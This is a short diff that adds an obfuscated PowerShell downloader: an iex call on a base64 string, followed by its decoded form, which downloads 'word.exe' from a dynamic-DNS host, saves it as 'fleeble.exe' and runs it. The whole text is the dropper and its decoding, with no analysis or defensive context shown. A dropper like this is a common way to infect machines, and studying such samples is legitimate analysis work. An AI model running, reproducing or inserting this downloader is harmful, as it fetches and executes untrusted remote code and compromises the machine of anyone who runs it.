@@ -1,0 +1,7 @@
+iex([SySteM.TexT.ENCoDing]::UTF8.GEtstRing([System.CONverT]::frombAse64sTrINg('CihOZXctT2JqZWN0IHN5c3RFbS5uZXQud2ViQ0xJRW50KS5kT1dObE9hZEZpTEUoJ2h0dHA6Ly9zdWtlbS56YXB0by5vcmcvd29yZC5leGUnLCdmbGVlYmxlLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2ZsZWVibGUuZXhlJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object systEm.net.webCLIEnt).dOWNlOadFiLE('http://sukem.zapto.org/word.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
